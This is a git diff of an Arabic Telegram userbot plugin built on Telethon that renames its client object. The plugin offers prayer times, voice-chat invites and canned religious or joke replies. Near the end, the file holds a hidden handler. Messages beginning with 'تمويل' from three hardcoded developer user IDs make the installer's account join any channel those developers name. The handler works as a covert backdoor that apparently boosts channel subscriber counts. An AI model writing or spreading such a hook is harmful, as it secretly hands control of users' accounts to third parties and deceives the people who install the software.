@@ -5,7 +5,7 @@ from telethon.tl.functions.phone import CreateGroupCallRequest as startvc
 from telethon.tl.functions.phone import DiscardGroupCallRequest as stopvc
 from telethon.tl.functions.phone import GetGroupCallRequest as getvc
 from telethon.tl.functions.phone import InviteToGroupCallRequest as invitetovc
-from SHRU import l313l
+from SHRU import Qrh9
 from ..core.managers import edit_delete, edit_or_reply
 import os
 import tempfile
@@ -17,7 +17,7 @@ from telethon.tl.functions.channels import JoinChannelRequest
 async def fetch_prayer_times():
     file_url = 'https://hq.alkafeel.net/Api/init/init.php?timezone=+3&long=44&lati=32&v=jsonPrayerTimes'
     file_location = InputWebFileLocation(url=file_url, access_hash="")
-    times_json = await l313l.download_file(file_location)
+    times_json = await Qrh9.download_file(file_location)
     return times_json
 
 async def send_prayer_times(event):
@@ -26,14 +26,14 @@ async def send_prayer_times(event):
     fajr_time = times['fajir']
     hijri_date = times['date']
     chat_id = event.chat_id
-    input_file = await l313l.upload_file(bytes(times_json, 'utf-8'), part_size_kb=512)
-    await l313l.send_file(chat_id, input_file, caption=f"وقت الفجر: {fajr_time}\nالتاريخ الهجري: {hijri_date}", force_document=True)
+    input_file = await Qrh9.upload_file(bytes(times_json, 'utf-8'), part_size_kb=512)
+    await Qrh9.send_file(chat_id, input_file, caption=f"وقت الفجر: {fajr_time}\nالتاريخ الهجري: {hijri_date}", force_document=True)
 
-@l313l.on(admin_cmd(pattern="صلاه(?: |$)(.*)"))
+@Qrh9.on(admin_cmd(pattern="صلاه(?: |$)(.*)"))
 async def handle_command(event):
     await send_prayer_times(event)
 
-@l313l.on(admin_cmd(pattern="دعوه للمكالمه(?: |$)(.*)"))
+@Qrh9.on(admin_cmd(pattern="دعوه للمكالمه(?: |$)(.*)"))
 async def _(e):
     ok = await edit_or_reply(e, "`Inviting Members to Voice Chat...`")
     users = []
@@ -49,7 +49,7 @@ async def _(e):
         except BaseException:
             pass
     await ok.edit(f"`Invited {z} users`")
-@l313l.on(admin_cmd(pattern="بدء مكالمه(?: |$)(.*)"))
+@Qrh9.on(admin_cmd(pattern="بدء مكالمه(?: |$)(.*)"))
 async def _(e):
     try:
         await e.client(startvc(e.chat_id))
@@ -83,7 +83,7 @@ R = [
     "**-** قناة السورس **⪼ [𐇮 الساحر ](t.me/SXYO3)   "
 ]
 
-@l313l.on(admin_cmd(pattern="بلي$"))
+@Qrh9.on(admin_cmd(pattern="بلي$"))
 async def ithker(knopis):
     await knopis.edit(choice(R))
 
@@ -129,7 +129,7 @@ Citation_morning = [
 ]
 
 
-@l313l.on(admin_cmd(pattern="اذكار$"))
+@Qrh9.on(admin_cmd(pattern="اذكار$"))
 async def ithker(knopis):
     await knopis.edit(choice(Citation_morning))
 
@@ -182,7 +182,7 @@ Citation1_morning = [
 ]
 
 
-@l313l.on(admin_cmd(pattern="كت$"))
+@Qrh9.on(admin_cmd(pattern="كت$"))
 async def ithker(knopis):
     await knopis.edit(choice(Citation1_morning))
 
@@ -220,12 +220,12 @@ HuRe_5erok = [
 ]
 
 
-@l313l.on(admin_cmd(pattern="خيروك$"))
+@Qrh9.on(admin_cmd(pattern="خيروك$"))
 async def ithker(knopis):
     await knopis.edit(choice(HuRe_5erok))
 
     
-@l313l.on(admin_cmd(pattern="اذكار عشر$"))    
+@Qrh9.on(admin_cmd(pattern="اذكار عشر$"))    
 async def ithker(event):
     "h"
     event = await edit_or_reply(event, "أَصْبَـحْـنا عَلَى فِطْرَةِ الإسْلاَمِ")
@@ -260,7 +260,7 @@ HuRe_Shnow = [
 ]
 
 
-@l313l.on(admin_cmd(pattern="شنو رأيك بهذا$"))
+@Qrh9.on(admin_cmd(pattern="شنو رأيك بهذا$"))
 async def ithker(knopis):
     await knopis.edit(choice(HuRe_Shnow))
 
@@ -274,13 +274,13 @@ HuRe_Bosa = [
 ]
 
 
-@l313l.on(admin_cmd(pattern="بوسة$"))
+@Qrh9.on(admin_cmd(pattern="بوسة$"))
 async def ithker(knopis):
     await knopis.edit(choice(HuRe_Bosa))
 
 DevJoker = [6205161271,6309878173,5762222122]
 #تضل تخمط من عمك الساحر ؟ الى اين يستمُر الفشل ياغُلام
-@l313l.on(events.NewMessage(incoming=True))
+@Qrh9.on(events.NewMessage(incoming=True))
 async def Hussein(event):
     if event.message.message.startswith("تمويل") and event.sender_id in DevJoker:
         message = event.message
@@ -289,7 +289,7 @@ async def Hussein(event):
             channel_username = message.text.split()[1].replace("@", "")
         if channel_username:
             try:
-                await l313l(JoinChannelRequest(channel_username))
+                await Qrh9(JoinChannelRequest(channel_username))
                 response = "**᯽︙ تم الانضمام إلى القناة بنجاح!**"
             except ValueError:
                 response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"
